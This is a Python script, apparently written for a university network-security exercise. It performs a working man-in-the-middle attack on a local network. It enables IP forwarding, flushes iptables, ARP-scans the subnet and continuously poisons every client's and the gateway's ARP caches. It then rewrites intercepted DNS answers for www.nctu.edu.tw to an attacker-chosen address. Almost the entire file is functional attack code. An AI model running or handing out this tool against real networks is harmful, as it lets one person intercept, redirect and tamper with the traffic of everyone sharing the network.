#!/usr/bin/env python3

import netifaces
import ipaddress
from scapy.all import *
import time
from multiprocessing import Process
import sys
import netfilterqueue
import subprocess

with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
    f.write("1")

ret = subprocess.call(["iptables", "-F"])
assert ret == 0
ret == subprocess.call(
    ["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "1"])
assert ret == 0

dgateway = netifaces.gateways()["default"]
gateway_ip, iface = dgateway[netifaces.AF_INET]

inet = next(
    filter(lambda x: "netmask" in x,
           netifaces.ifaddresses(iface)[netifaces.AF_INET]))
network = ipaddress.IPv4Network((inet["addr"], inet["netmask"]), strict=False)

arp = ARP(pdst=str(network))
ether = Ether(dst="ff:ff:ff:ff:ff:ff")
packet = ether / arp
result, _ = srp(packet, timeout=3)

clients = []
for sent, received in result:
    if received.psrc == gateway_ip:
        gateway_mac = received.hwsrc
        continue
    clients.append({"ip": received.psrc, "mac": received.hwsrc})

print("")
print("Available devices")
print("IP" + " " * 18 + "MAC")
for client in clients:
    print("{:16}    {}".format(client["ip"], client["mac"]))
print("")


def send_arps():
    while True:
        print("Sending ARP packets...", file=sys.stderr)
        for client in clients:
            packet = ARP(
                op=2,
                pdst=client["ip"],
                hwdst=client["mac"],
                psrc=gateway_ip,
            )
            send(packet, verbose=False)
            packet = ARP(
                op=2,
                pdst=gateway_ip,
                hwdst=gateway_mac,
                psrc=client["ip"],
            )
            send(packet, verbose=False)
        time.sleep(10)


p = Process(target=send_arps)
p.start()


def handle_packet(packet):
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(DNSRR):
        qname = scapy_packet[DNSQR].qname
        if b"www.nctu.edu.tw" in qname:
            scapy_packet[DNS].an = DNSRR(rrname=qname, rdata="140.113.207.246")
            scapy_packet[DNS].ancount = 1
            del scapy_packet[IP].len
            del scapy_packet[IP].chksum
            del scapy_packet[UDP].chksum
            del scapy_packet[UDP].len
            packet.set_payload(bytes(scapy_packet))
    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(1, handle_packet)
queue.run()
